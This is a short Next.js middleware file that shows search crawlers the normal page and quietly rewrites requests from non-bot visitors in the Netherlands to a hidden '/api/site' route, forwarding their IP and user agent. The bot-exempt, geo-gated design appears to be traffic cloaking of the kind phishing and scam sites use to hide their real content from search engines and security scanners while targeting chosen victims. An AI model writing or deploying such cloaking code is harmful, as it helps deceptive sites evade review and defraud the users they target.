import { NextRequest, NextResponse } from 'next/server';

function isBot(ua: string) {
    return /bot|crawl|spider|slurp|bing|yandex|baidu/i.test(ua);
}

// Список дозволених країн
const allowedCountries = ['NL']; // Niderlandy

export async function middleware(req: NextRequest) {
    const ua = req.headers.get('user-agent')?.toLowerCase() || '';
    const forwarded = req.headers.get('x-forwarded-for');
    const ip = forwarded?.split(',')[0].trim() || '8.8.8.8';

    if (isBot(ua)) return NextResponse.next();

    try {
        const geo = await fetch(`https://ipwho.is/${ip}`).then((res) => res.json());

        if (geo.success && allowedCountries.includes(geo.country_code)) {
            const url = req.nextUrl.clone();
            url.pathname = '/api/site';
            url.searchParams.set('ip', ip);
            url.searchParams.set('ua', ua);
            return NextResponse.rewrite(url);
        }
    } catch (err) {
        console.error('[GEO FAIL]', err);
    }

    return NextResponse.next();
}

export const config = {
    matcher: [
        '/',
        '/((?!_next|api|favicon.ico|assets|fonts|images|img|.*\\.svg$|.*\\.png$|.*\\.jpg$|.*\\.jpeg$|.*\\.webp$|.*\\.css$|.*\\.js$).*)',
    ],
};
